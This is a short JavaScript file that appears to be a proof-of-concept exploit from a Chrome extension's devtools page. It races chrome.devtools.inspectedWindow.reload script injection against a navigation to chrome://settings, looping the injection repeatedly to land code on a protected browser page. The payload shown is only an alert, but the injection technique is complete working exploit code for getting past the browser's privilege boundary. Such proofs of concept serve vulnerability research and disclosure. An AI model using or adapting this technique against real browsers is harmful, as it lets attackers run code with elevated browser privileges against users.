//function which injects the content script into the inspected page
function inject_script() {
  chrome.devtools.inspectedWindow.reload({
    "injectedScript": `
    (async () => {
      //check the origin, this script won't do anything on a non chrome page
      console.log(origin);
      if (!origin.startsWith("chrome://")) return;

      alert("hello from chrome.devtools.inspectedWindow.reload");
    })();
    `
  });
} //interval to keep trying to inject the content script
//there's a tiny window of time in which the content script will be
//injected into a protected page, so this needs to run frequently


function start_interval() {
  setInterval(() => {
    //loop to increase our odds
    for (let i = 0; i < 5; i++) {
      inject_script();
    }
  }, 0);
}

async function main() {
  //start the interval to inject the content script
  start_interval(); //navigate the inspected page to chrome://settings

  let tab = await chrome.tabs.get(chrome.devtools.inspectedWindow.tabId);
  await chrome.tabs.update(tab.id, {
    url: "chrome://settings"
  }); //if this times out we need to retry or abort

  await new Promise(resolve => {
    setTimeout(resolve, 1000);
  });
  let new_tab = await chrome.tabs.get(tab.id); //we're still on the original page, so reload the extension frame to retry

  if (!new_tab.url.startsWith("chrome://settings")) {
    location.reload();
  }
}

main();